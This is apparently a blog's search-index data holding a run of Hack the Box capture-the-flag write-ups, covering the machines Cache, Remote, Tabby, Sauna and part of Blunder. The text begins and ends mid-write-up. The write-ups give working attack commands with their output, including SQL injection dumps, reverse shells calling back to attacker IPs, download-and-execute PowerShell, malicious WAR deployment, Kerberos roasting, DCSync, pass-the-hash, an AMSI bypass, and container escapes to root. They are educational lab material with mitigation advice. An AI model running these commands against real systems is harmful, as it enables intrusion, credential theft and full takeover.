gzip, deflateConnection: closeCookie: OpenEMR=d3jlli8duq6uv54u0m3aeqj3p4; PHPSESSID=tnhhjq3o1mlh11se0aab74nclvUpgrade-Insecure-Requests: 1DNT: 1Cache-Control: max-age=0Next we will use this request with sqlmap to enumerate the available databases.$ sqlmap -r portal.req --dbs[...]available databases [2]:[*] information_schema[*] openemr[...]Two databases come back, but only one will contain useful information, the “openemr” database. Let’s continue and see what tables are available.$ sqlmap -r portal.req -D openemr --tables[...]| user_settings || users || users_facility || users_secure |[...]Great, a few tables are available here, but the most promising one may be “users_secure” which will potentially have some usernames and passwords. Let’s dump it with sqlmap.$ sqlmap -r portal.req -D openemr -T users_secure --dump[...]openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.[...]We receive the openemr_admin credentials with a password hash. Let’s crack it with john.The password for the openemr_admin user is xxxxxx. This will allow us to successfully log in, but from our earlier research, we found that there is an authenticated remote code execution vulnerability.We’ll use this to open a reverse shell to our attack box. Let’s start a netcat listener.$ nc -lvnp 4444We’ll grab the python script from Exploit DB and run it with the URL, username, and password, along with our chosen command.$ python rce_openemr.py http://hms.htb/ -u openemr_admin -p xxxxxx -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.179/4444 0&amp;gt;&amp;amp;1&#39;In this case, it’ll call back to our box with a shell.Success, we’ve gained a foothold. Enumerating the /etc/passwd file reveals two users are available, luffy and ash. Enumerating doesn’t reveal a lot, but listing the processes reveals that memcache, a cache for data for websites, is running, which may contain some sensitive information that we can use to escalate to another user.$ ps -auxA quick search reveals how to dump memcache and retrieve the keys which may prove useful.To access the memcache, we’ll use telnet. The port for this is 11211.$ telnet localhost 11211This website has a great cheat-sheet on memcache, but the command we want is lru_crawler, which will dump the available keys.&amp;gt; lru_crawler metadump allkey=account exp=-1 la=1593896101 cas=31 fetch=no cls=1 size=75key=file exp=-1 la=1593896101 cas=32 fetch=no cls=1 size=70key=passwd exp=-1 la=1593896101 cas=33 fetch=no cls=1 size=74key=user exp=-1 la=1593896101 cas=34 fetch=no cls=1 size=68ENDWe’ll grab the user key, to see if it is anything new.&amp;gt; get userVALUE user 0 5luffyENDNext, let’s grab the password key.&amp;gt; get passwdVALUE passwd 0 90n3_p1ec3ENDWith any luck, these new credentials can help us move laterally to another user. Let’s give SSH a shot on our Kali box.Success, but it doesn’t look like the user flag is within the home directory of the luffy user. Let’s see what we can find to elevate to ash.From the webpage, there was a login screen that we didn’t have any credentials for. If we enumerate the webpages on the box with our remote session, there’s a potential a cleartext password for that page is available.After some searching we find a javascript file at the path /var/www/cache.htb/public_html/jquery that contains the function that checks whether the password works.[...] function checkCorrectPassword(){ var Password = $(&quot;#password&quot;).val(); if(Password != &#39;H@v3_fun&#39;){ alert(&quot;Password didn&#39;t Match&quot;); error_correctPassword = true; } } function checkCorrectUsername(){ var Username = $(&quot;#username&quot;).val(); if(Username != &quot;ash&quot;){ alert(&quot;Username didn&#39;t Match&quot;); error_username = true; } }[...]Let’s see if user ash reused the password H@v3_fun, allowing us to change users.$ su ashIt worked. Let’s grab the user flag.Root FlagFirst, let’s use secure copy to transfer the lse.sh script to the Cache box. This a script for Linux Smart Enumeration, which allow us to quickly enumerate the ways we can escalate privileges.scp lse.sh luffy@10.10.10.188:/tmpLet’s run it.Docker is available and may offer a means of elevating our privileges to root, but the user ash is not member of the group. Let’s check luffy. Swapping over and checking shows that luffy is a member of the docker group.GTFObins is a great repository for binaries that be exploited to elevate privileges, and fortunately for us, Docker is something we can abuse.All we have to do is run the following command found at the website.$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt shSuccess, a root shell has spawned, let’s grab the root flag.Mitigation Critical vulnerabilities, like a SQL injection, need to patched as soon as possible. Even if no real information is stored in these databases, it may provide a means to further exploit the service and gain a foothold on the system, like on this machine. Password reuse should be avoided. Especially if the password is being stored locally in plaintext. Secure accounts that have special privileges with certain applications. These privileges can be abused to elevate privileges on that account, and should have special considerations. Final ThoughtsGreat box, a lot of fun and definitely a bit challenging. Pretty straight forward, I learned a bit about memcache and Docker abuse. I will definitely look back on this box going forward." }, { "title": "Hack the Box - Remote", "url": "/posts/HTB-Remote/", "categories": "Hack the Box, Windows", "tags": "windows, ctf, htb", "date": "2020-07-03 13:00:00 -0500", "snippet": "This writeup is for the HackTheBox Windows machine Remote. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Webpage enumeration Public NFS drives Exploitation Authenticated RCE on CMSPriv Esc Weak Service ConfigurationUser FlagFirst step we’ll do is use nmap to scan Remote. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Wed Jul 1 21:07:29 2020 as: nmap -sC -sV -O -oA scan180 10.10.10.180Nmap scan report for 10.10.10.180Host is up (0.081s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst:|_ SYST: Windows_NT80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Home - Acme Widgets111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/tcp6 rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 2,3,4 111/udp6 rpcbind| 100003 2,3 2049/udp nfs| 100003 2,3 2049/udp6 nfs| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/tcp6 nfs| 100005 1,2,3 2049/tcp mountd| 100005 1,2,3 2049/tcp6 mountd| 100005 1,2,3 2049/udp mountd| 100005 1,2,3 2049/udp6 mountd| 100021 1,2,3,4 2049/tcp nlockmgr| 100021 1,2,3,4 2049/tcp6 nlockmgr| 100021 1,2,3,4 2049/udp nlockmgr| 100021 1,2,3,4 2049/udp6 nlockmgr| 100024 1 2049/tcp status| 100024 1 2049/tcp6 status| 100024 1 2049/udp status|_ 100024 1 2049/udp6 status135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?2049/tcp open mountd 1-3 (RPC #100005)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=7/1%OT=21%CT=1%CU=35998%PV=Y%DS=2%DC=I%G=Y%TM=5EFD41DCOS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=109%CI=I%II=I%TS=U)SEQ(SP=FF%OS:GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%OOS:3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=OS:FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y%OS:Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%FOS:=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%OS:T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RDOS:=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%SOS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCKOS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)Network Distance: 2 hopsService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 4m20s| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2020-07-02T02:12:59|_ start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jul 1 21:09:32 2020 -- 1 IP address (1 host up) scanned in 123.75 secondsOur results indicate a lot of services are available to enumerate. First thing, it looks like port 21, FTP, is open and anonymous login is available. Enumerating FTP, however, yields nothing of value.Additionally, our scan shows that port 80 is open as well, which means we have a webpage to enumerate. While we do that, let’s run a full port scan to cover our bases.$ sudo nmap -sC -sV -O -p- -oA full180 10.10.10.1805985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)The only useful information from the full scan is that port 5985 is open, indicating that WinRM 2.0 (Microsoft Windows Remote Management) is available. If we find some credentials, we may be able to gain a foothold or escalate privileges utilizing this service.Moving on, let’s navigate to the webpage.Looking around, there seems to be a lot of reference to “Umbraco”. A quick google search reveals that Umbraco is a Content Management System (CMS). The admin page can also be found at http://TheWebsite/Umbraco/. Let’s check it out.Any attempt to exploit the login doesn’t yield much, and their doesn’t appear to be any unauthenticated vulnerabilities and enumerating the site further is unsuccessful, so let’s continue to enumerate ports.One port that stands out is port 2049, indicating NFS drives that may be mountable. If we have access, this may yield some more information. The command showmount should give us further details.$ sudo showmount -e 10.10.10.180Export list for 10.10.10.180:/site_backups (everyone)Looks like the drive /site_backups is visible and it also looks like it’s available to everyone. Poor configuration choice. Let’s go ahead and mount it, and see what we can find.$ mkdir /tmp/mount$ sudo mount -t nfs 10.10.10.180:/site_backups /tmp/mountSearching through the directory, we see an interesting file Umbraco.sdf within the App_Data subdirectory. The extension indicates that this may be a database file. With any luck, we may find be able to see some credentials. Let’s use the strings command to view it’s contents.$ cd /tmp/mount$ cd App_Data$ strings Umbraco.sdf | lessWithin, the file we find has some interesting information.It looks like we’ve found a login for the Umbraco CMS, admin@htb.local, along with a hashed password. Using an online decoder, we determine the SHA-1 password is baconandcheese.Let’s head back to the Umbraco login page at http://10.10.10.180/umbraco and try our newly acquired credentials.After successfully logging in, we can now view the version number for Umbraco.From earlier, we remember the unauthenticated vulnerabilities for this CMS were limited but there was an authenticated RCE for administrators. The affected version is 7.12.4, the version we currently have admin access to.Let’s modify the configuration on the proof of concept code and specify the command we’d like to execute, our credentials, and the target host URL.command = &quot;ipconfig&quot;login = &quot;admin@htb.local&quot;;password=&quot;baconandcheese&quot;;host = &quot;http://10.10.10.180&quot;;Let’s also remove the bit of code regarding the cookie data and modify the attack portion to return the results of our command. The addition of this section of code should get us what we need:soup = BeautifulSoup(r4.text, &#39;html.parser&#39;)output = soup.find(id=&quot;result&quot;).getText()print(output)We’ll test our newly weaponized code with an ipconfig command.Success. Our next step will be using this exploit to gain a foothold. We’ll grab a mini-reverse Powershell script and host it on web server that we will use to upload files from. We’ll also host the Netcat executable, which we can use to upgrade our dumb shell. We’ll modify our files with our IP address and port before getting them on the machine.$ mkdir http &amp;amp;&amp;amp; cd http$ sudo python -m SimpleHTTPServer 80Let’s start a Netcat listener in preparation as well.$ nc -lvnp 4444Within our exploit python file, we will change our command to the following, which will download and execute our reverse shell script.command = &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://10.10.15.50/mini-reverse.ps1&#39;)&quot;After running the RCE exploit, we can see that the box connects successfully to our HTTP server and our Netcat listener successfully connects. Let’s not try to use Netcat upgrade our shell. We’ll start another listener for this new session.$ nc -lvnp 4445We’ll use our python exploit to quickly grab the nc.exe file as well.command = &quot;wget &#39;http://10.10.14.85/nc.exe&#39; -outfile &#39;/Users/Public/Documents/nc.exe&#39;&quot;Within the dumb shell that we have from earlier, we’ll run the following command, using Netcat to open a better shell.&amp;gt; C:\\Users\\Public\\Documents\\nc.exe 10.10.15.50 4445 -e powershell.exeNow, let’s grab the user flag from the public user directory.Root FlagNow, onto root. Let’s get the PowerUp script from PowerSploit onto the box. This will allow us to enumerate any avenues to escalate our privileges.First, we’ll place the script into our web server directory and use our Powershell session to download it. Let’s place it into C:\\Users\\Public\\Documents\\ directory.&amp;gt; invoke-webrequest -Uri http://10.10.15.50/PowerUp.ps1 -OutFile PowerUp.ps1&amp;gt; Import-Module C:\\Users\\Public\\Documents\\powerup.ps1Now that the script is downloaded and we’ve imported the module, let’s run the Invoke-AllChecks command.&amp;gt; Invoke-AllChecks[...][*] Checking service permissions...ServiceName : UsoSvcPath : C:\\Windows\\system32\\svchost.exe -k netsvcs -pStartName : LocalSystemAbuseFunction : Invoke-ServiceAbuse -Name &#39;UsoSvc&#39;CanRestart : True[...]Looks like we have a service that we can abuse. The Update Orchestrator or UsoSvc can be abused by allowing our current user to manipulate the service path so that when the service is stopped and started, it’ll execute a command as system. This article by Read Team Experiments gives a bit more detail.The PowerUp script suggests a command in its results, Invoke-ServiceAbuse, but this didn’t work consistently enough, so let’s do it manually.First, we’ll listen on a new port for a reverse shell.$ nc -lvnp 4446Next, let’s use sc.exe to configure the binpath of the UsoSvc service. We’ll change it to a command that will run our Netcat executable to open reverse Powershell session at the port we specified.&amp;gt; sc.exe config UsoSvc binpath=&quot;C:\\Users\\Public\\Documents\\nc.exe 10.10.15.50 4446 -e powershell.exe&quot;Now, let’s stop and start the service.&amp;gt; sc.exe stop usosvc&amp;gt; sc.exe start usosvcBack on our machine, our listener should connect, with a system shell. Let’s grab the root flag!Mitigation Generally, unless it’s needed for operational purposes, having a CMS publicly facing is dangerous, and extra security precautions should be taken into consideration. Additionally and along the same lines, mountable NFS drives should not be facing the public, especially if they are open to everyone. This is a terrible configuration and there isn’t really a reason that these two things should exist concurrently. Keep software updated, especially a CMS that is public facing. Check service configurations and understand the risks involved with keeping weak configurations. Using tools that can automate these checks will ease the burden on an administrator. Final ThoughtsThis box was enjoyable. I appreciated learning a bit more about how to utilize Powershell and command prompt to download files off of our attacking machine with a web server. Other than that, the box was relatively straightforward, although the service abuse required a bit of research to get working but I learned a lot about this process. Additionally, there is an alternate way to escalate privileges with Teamviewer to administrator that I do not cover here, but I may add it in the future." }, { "title": "Hack the Box - Tabby", "url": "/posts/HTB-Tabby/", "categories": "Hack the Box, Linux", "tags": "linux, ctf, htb", "date": "2020-07-01 13:00:00 -0500", "snippet": "This is my write up for the HackTheBox Linux machine Tabby. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Webpage enumerationExploitation Local file inclusionPriv Esc LXD group policy abuseUser FlagLet’s enumerate some info about Tabby with an nmap scan. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Fri Jun 26 16:50:18 2020 as: nmap -sC -sV -O -oA scan191 10.10.10.191Nmap scan report for 10.10.10.191Host is up (0.21s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION21/tcp closed ftp80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-generator: Blunder|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Blunder | A blunder of interesting factsAggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.26 - 2.6.35 (89%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (89%), Linux 3.16 - 4.6 (89%), Linux 2.6.32 - 3.13 (88%), Linux 3.3 (88%), Linux 2.6.23 - 2.6.38 (88%), Linux 2.6.31 - 2.6.32 (88%), Linux 2.6.32 (88%), Linux 2.6.32 - 2.6.39 (88%)No exact OS matches for host (test conditions non-ideal).OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jun 2 16:52:39 2020 -- 1 IP address (1 host up) scanned in 141.22 secondsOur scan indicates that port 21 is visible, but closed. It also shows that port 80 is open, serving an HTTP webpage. The normal scan only checks the 1000 most popular ports, so let’s also run a full port scan.# Nmap 7.80 scan initiated Fri Jun 26 17:10:01 2020 as: nmap -O -sV -sC -p- -oN full194[...]8080/tcp open http Apache Tomcat|_http-open-proxy: Proxy might be redirecting requests|_http-title: Apache Tomcat[...]Our full scan also reveals that port 8080 is open and an HTTP webpage running Apache Tomcat is available. Let’s go ahead an enumerate the webpage on port 80 first.The primary website looks like a frontend for a hosting service. A lot of information is available, especially about a recent data breach, but overall, the site doesn’t have anything that may prove useful.However, something stands out on the news.php page. There is a file parameter in the URL and the value “statement” is being passed to it, which we can assume is the file name that is loaded to the page. If the input for the variable is not properly sanitized, we may be able to perform a directory traversal attack due to a local file inclusion (LFI) vulnerability.Instead of guessing a file name and location we want to see, let’s enumerate port 8080 and return to this later.This looks like the default page for Apache Tomcat. Clicking the various links yields nothing useful, but the file paths throughout the page hint to the file system structure of the box. A quick search reveals that some tomcat credentials may be stored in the tomcat-users.xml file somewhere within the Tomcat directory.We can also enumerate the version of Tomcat based on this page: version 9. The credentials for this version should be located at the file path /usr/share/tomcat9/etc/tomcat-users.xml. This would be a great opportunity to go back to our potential LFI vulnerability at the http://10.10.10.194/news.php?file=statement page and see if we can retrieve this file.We’ll capture the request to this page with Burp Suite so we can easily manipulate the file parameter. To traverse to a specific file, we’ll have to go back multiple directories with ../../ to get the root directory, then we can specify our full target file path. We have to do it quite a bit since we’re not sure where our current directory is. To avoid any misinterpretations with the slashes, we need to URL encode them. Let’s replace the “statement” variable with our encoded traversal and the full file path to the file we’re trying to retrieve.Let’s send our request.Success, we receive the file in our response.Additionally, we also see the roles that the tomcat user has. The manager-script role allows us to remotely deploy web archive (WAR) files to the webserver, with our new found credentials.First, we need to create a malicious WAR file. To do this, we’ll use msfvenom.$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.121 LPORT=4444 -f war &amp;gt; evil.warNext, we’ll use curl to upload our file, utilizing the credentials we found.$ curl --upload-file evil.war http://tomcat:\\$3cureP4s5w0rd123\\!@10.10.10.194:8080/manager/text/deploy?path=/evilLet’s start our listener in preparation for a reverse shell.$ nc -lvnp 4444Finally, navigating to http://10.10.10.194:8080/evil/ triggers our payload, and we receive a reverse shell. We’ll also make our shell a little more interactive.$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;Let’s look around where we landed. Enumerating a bit leads us to the /var/www/html/files directory. Here, we find a zipped backup named 16162020_backup.zip. Let’s use netcat to download this to our machine and give it a look.On our machine, we’ll listen for a callback with the file.$ nc -lp 5555 &amp;gt; backup.zipOn the Tabby box let’s run the following command to send it.$ nc -w 3 10.10.14.121 5555 &amp;lt; 16162020_backup.zipAttempting to open the zip prompts for a password. We can extract password hashes with zip2john or one of the various online extractors. I had problmes with zip2john, so I went with an online tool.We’ll save the output into a file named zip.hash and use john to crack it.The hash cracks and we receive a password: admin@it. In the /etc/passwd file, we find the user ash is present on the box. Let’s see if we can change users with our new password.$ su ashIt works! We’ve successfully moved to ash. Let’s grab the first flag.Root FlagOn to root. First thing, let’s do a bit of enumeration with the user ash. Just to check out own privileges, we’ll run the id and sudo -l commands. sudo -l is of little use, but id reveals the groups that ash is apart of, the most interesting being lxd.$ iduid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)A little research reveals that LXD, a container technology, can be used to perform privilege escalation.Essentially, we’re going to build a Linux Container with ash, duplicating the host file system, then we can open a shell as root within our container, allowing us to enumerate the file system of the host machine in a privileged context.First, let’s grab the LXD image that we’ll use for the privilege escalation. We’ll also run the build-alpine script to create the image.$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine$ sudo bash build-alpineOn the target machine, we’ll start a netcat listener in preparation to download the image.$ nc -lp 5555 &amp;gt; alpine-v3.12-x86_64-20200701_1818.tar.gzNext, we’ll execute the following command on our box to start the transfer.$ nc -w 3 10.10.10.194 5555 &amp;lt; alpine-v3.12-x86_64-20200701_1818.tar.gzNow, we’ll switch back to the machine and add the image to LXD with the following command. We’ll also list the images to make sure it worked.$ lxc image import alpine-v3.12-x86_64-20200701_1818.tar.gz --alias pe4me$ lxc image list+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE |+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+| pe4me | e75871098130 | no | alpine v3.12 (20200701_18:18) | x86_64 | CONTAINER | 3.05MB | Jul 2, 2020 at 12:05am (UTC) |+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+Looks to be there. Finally let’s run this series of commands that will prepare the container.$ lxd init --auto$ lxc init pe4me ignite -c security.privileged=true$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true$ lxc start igniteWith everything prepared, we’ll execute this final command to open a shell as root.Success! Let’s navigate to where the image is mounted and grab our final flag!Mitigation It’s important to be aware of what a Local File Inclusion vulnerability looks like and the impact of one existing on a webpage. The best practice is to create a whitelist for filenames to prevent displaying sensitive files. Additionally, identifiers should be used in place of the actual filename and should call the file themselves. This article from PivotPoint Security provides some great details. Avoid leaving the default page or pages for a web server environment. This can provide an attacker with invaluable data about version, applications, etc.. Without the default Apache Tomcat page revealing the version and file location information, it would have been much more difficult to produce anything of substance with the LFI vulnerability. Due to the power of a user in the lxd group, they should be treated with as much caution and security as the root user. According to Shenanigans Labs: “The LXD team has updated their documentation to warn not to add users to the lxd group unless you trust them with root level access to your host.” Final ThoughtsThis was a fun box. I enjoyed that the path to root wasn’t necessarily a string of severe vulnerabilities, but mostly misconfigurations that were abused because of the LFI. Without it, the other issues would not have been exasperated. Abusing the lxd group was also interesting to see and step through." }, { "title": "Hack the Box - Sauna", "url": "/posts/HTB-Sauna/", "categories": "Hack the Box, Windows", "tags": "windows, ctf, htb", "date": "2020-06-06 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Windows machine Sauna. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Webpage users WinPEAS Exploitation Weak password policy Kerberoasting - harvest non-preauth responses Priv Esc AutoLogon credentials DCSync attack User FlagWe’ll start Sauna by running my nmap scan. By the looks of the running services, this box is an Active Directory domain controller. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Fri Jun 5 18:02:46 2020 as: nmap -sC -sV -O -oA scan175 10.10.10.175Nmap scan report for 10.10.10.175Host is up (0.11s latency).Not shown: 988 filtered portsPORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings:| DNSVersionBindReqTCP:| version|_ bind80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Egotistical Bank :: Home88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-06 07:07:03Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=6/5%Time=5EDACF34%P=x86_64-pc-linux-gnu%r(DNSVeSF:rsionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\xSF:04bind\\0\\0\\x10\\0\\x03&quot;);Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portOS fingerprint not ideal because: Missing a closed TCP port so results incompleteNo OS matches for hostService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 8h03m51s| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-06-06T07:09:33|_ start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Jun 5 18:07:48 2020 -- 1 IP address (1 host up) scanned in 302.89 secondsAdditionally, we’ll run a full port scan as well.$ sudo nmap -sC -sV -O -p- -oA full175 10.10.10.1755985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)This reveals that port 5985 is open, indicating to us that WinRM 2.0 (Microsoft Windows Remote Management) is available. This will provide us a potential foothold once we gain credentials.Next, we’ll run enum4linux, a tool primarily used to enumerate Windows or Samba systems.$ enum4linux 10.10.10.175Nothing of significance is revealed.Alright, the box is also running IIS on port 80, so let’s see what we can enumerate on their website. Under the About Us tab we find information on the team, who may potentially be users. We’ll add them to a users text file.We’ll format the names in a typical way you may see them on an Active Directory environment. Let’s go ahead and do a few variants to just to be sure.fergus.smithshaun.coinsbowie.taylorsophie.driverhugo.bearsteven.kerbfsmithscoinsbtaylorsdriverhbearskerbWithout passwords, one of our options on a Windows domain controller using Kerberos is something called kerberoasting. This article is a great resource that goes into better detail on these processes. Essentially, we can use a tool from Impacket to potentially harvest some non-preauth AS_REP responses. This may reveal some password hashes that we can crack.Using our list, we can run our command GetNPUsers.py to attempt to harvest these responses.$ GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcatSuccess! This yields a hash for the user fsmith. We’ll use john to crack the hash and reveal the users password.$ sudo john user.hash --wordlist=rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])Will run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusThestrokes23 ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)1g 0:00:00:22 DONE (2020-06-05 22:58) 0.04357g/s 459204p/s 459204c/s 459204C/s Thing..ThereisnospoonUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completedWe have a few options with these credentials. Let’s go ahead and try to remotely connect to the domain controller with evil-winrm.$ evil-winrm -i 10.10.10.175 -u fsmith -p &#39;Thestrokes23&#39;We successfully connect. Now we have our foothold, let’s collect the user flag.Root FlagNow that we have a foothold, let’s upload winPEAS.exe to enumerate the system further and see what options exist for privilege escalation.&amp;gt; upload winPEASany.exe&amp;gt; ./winPEASany.exeThe results come back and it looks like some AutoLogon credentials were found for the user svc_loanmgr. We can verify the correct username by using the command net user /domain.Let’s use these credentials to remotely access the domain controller. We’ll also throw PowerView.ps1 into a scripts directory so we can invoke some PowerSploit commands during our evil-winrm session.$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p &#39;Moneymakestheworldgoround!&#39; -s scripts/Using evil-winrm let’s bypass AMSI. Next we’ll run our PowerView.ps1 script, then invoke aclscanner which will return certain rights and accesses for our user. We can also use Bloodhound to find a means of attack.&amp;gt; Bypass-4MSI&amp;gt; PowerView.ps1&amp;gt; invoke-aclscannerThe results indicate that the user svc_loanmgr has the ExtendedRight privilege, which we can abuse to perform a DCSync attack. This will trick the domain controller into thinking we are a new DC on the network and will sync with us, providing all the user NTLM hashes.This can be accomplished using the secretsdump.py tool from Impacket. We’ll exit our current remote session and run our command.$ secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175Success! We receive NTLM hashes for all the users, including the Administrator. Let’s use psexec.py to perform a pass-the-hash attack, and connect to the box as the Administrator.$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175It was successful and we’ve escalated our privileges.Finally, let’s capture the root flag.Mitigation There a few ways to mitigate the risk of kerberoasting; a strong password policy helps alleviate the chance that someone will crack a hash. Additionally, avoid accounts with pre-authentication. If an organization must have that enabled, they need to have very complex passwords, as the hash is readily exposed. Most importantly, even if the hash can’t be cracked, pass-the-hash attacks can still occur. AutoLogin credentials should be avoided. If an account must have that enabled, special consideration should be taken regarding the risks of a compromise of that account’s privileges. A system administrator must understand the implication of a user having the right to DCSync and the implications of a DCSync attack being performed. The user that ends up with this right must be protected. AutoLogin credentials on such a user is poor risk mitigation. Final ThoughtsThis box was challenging for me, having little experience with Kerberos and how to attack it. I learned a lot, and with a little research, it really helped me grasp how these authentication methods function. The DCSync privilege escalation was also interesting, I really enjoyed researching what to do with the privileges I had." }, { "title": "Hack the Box - Blunder", "url": "/posts/HTB-Blunder/", "categories": "Hack the Box, Linux", "tags": "linux, ctf, htb", "date": "2020-06-04 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Linux machine Blunder. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration Webpage enumeration CMS login brute force Exploitation CMS directory traversal attackPriv Esc Sudo security bypassUser FlagFirst, let’s scan Blunder with nmap. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Tue Jun 2 16:50:18 2020 as: nmap -sC -sV -O -oA scan191 10.10.10.191Nmap scan report for 10.10.10.191Host is up (0.21s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION21/tcp closed ftp80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-generator: Blunder|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Blunder | A blunder of interesting factsAggressive OS guesses: HP 